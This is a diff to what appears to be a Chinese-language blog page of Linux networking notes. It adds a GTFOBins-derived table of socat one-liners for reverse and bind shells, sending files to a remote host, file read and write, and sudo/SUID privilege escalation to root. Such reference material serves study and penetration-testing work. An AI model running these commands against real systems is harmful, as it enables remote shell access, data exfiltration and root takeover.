@@ -2594,6 +2594,61 @@
 <li><code>reuseaddr</code>：允许端口重用，避免 “端口已被占用” 的问题。</li>
 <li><code>fork</code>：让 <code>socat</code> 处理多个连接，而不是只接受一个。<br>上面的指令最后加上&amp;,让它在后台进行</li>
 </ul>
+<p>此外socat还可进行读取文件，写入文件，sudo提权，等等  <a href="https://gtfobins.github.io/gtfobins/socat/">https://gtfobins.github.io/gtfobins/socat/</a></p>
+<table>
+<thead>
+<tr>
+<th><strong>功能</strong></th>
+<th><strong>命令</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>受限环境逃逸</strong></td>
+<td><code>socat stdin exec:/bin/sh</code></td>
+<td>在受限环境中获取交互式 shell</td>
+</tr>
+<tr>
+<td><strong>反向 shell</strong></td>
+<td><code>socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
+<td>目标机向攻击者回连 shell</td>
+</tr>
+<tr>
+<td><strong>绑定 shell</strong></td>
+<td><code>socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane</code></td>
+<td>目标机监听端口，攻击者连接获取 shell</td>
+</tr>
+<tr>
+<td><strong>文件上传</strong></td>
+<td><code>socat -u file:$LFILE tcp-connect:$RHOST:$RPORT</code></td>
+<td>目标机向攻击者上传文件</td>
+</tr>
+<tr>
+<td><strong>文件下载</strong></td>
+<td><code>socat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat</code></td>
+<td>攻击者向目标机发送文件</td>
+</tr>
+<tr>
+<td><strong>文件写入</strong></td>
+<td><code>socat -u &#39;exec:echo DATA&#39; &quot;open:$LFILE,creat&quot;</code></td>
+<td>在目标机写入数据</td>
+</tr>
+<tr>
+<td><strong>文件读取</strong></td>
+<td><code>socat -u &quot;file:$LFILE&quot; -</code></td>
+<td>读取文件内容</td>
+</tr>
+<tr>
+<td><strong>sudo 提权</strong></td>
+<td><code>sudo socat stdin exec:/bin/sh</code></td>
+<td>如果 <code>socat</code> 可用 sudo，则可获取 root shell</td>
+</tr>
+<tr>
+<td><strong>SUID 提权</strong></td>
+<td><code>sudo install -m =xs $(which socat) .</code></td>
+<td>复制 <code>socat</code> 并利用 SUID 提权</td>
+</tr>
+</tbody></table>
 <h2 id="netstat-lntup"><a href="#netstat-lntup" class="headerlink" title="netstat -lntup"></a>netstat -lntup</h2><p><code>netstat -lntup</code> 是 Linux 下用于查看当前监听的网络端口及其对应进程的命令。</p>
 <h3 id="参数解析"><a href="#参数解析" class="headerlink" title="参数解析"></a>参数解析</h3><ul>
 <li><code>-l</code> (<code>--listening</code>)：显示 <strong>正在监听</strong> 的端口（即服务在等待连接）。</li>
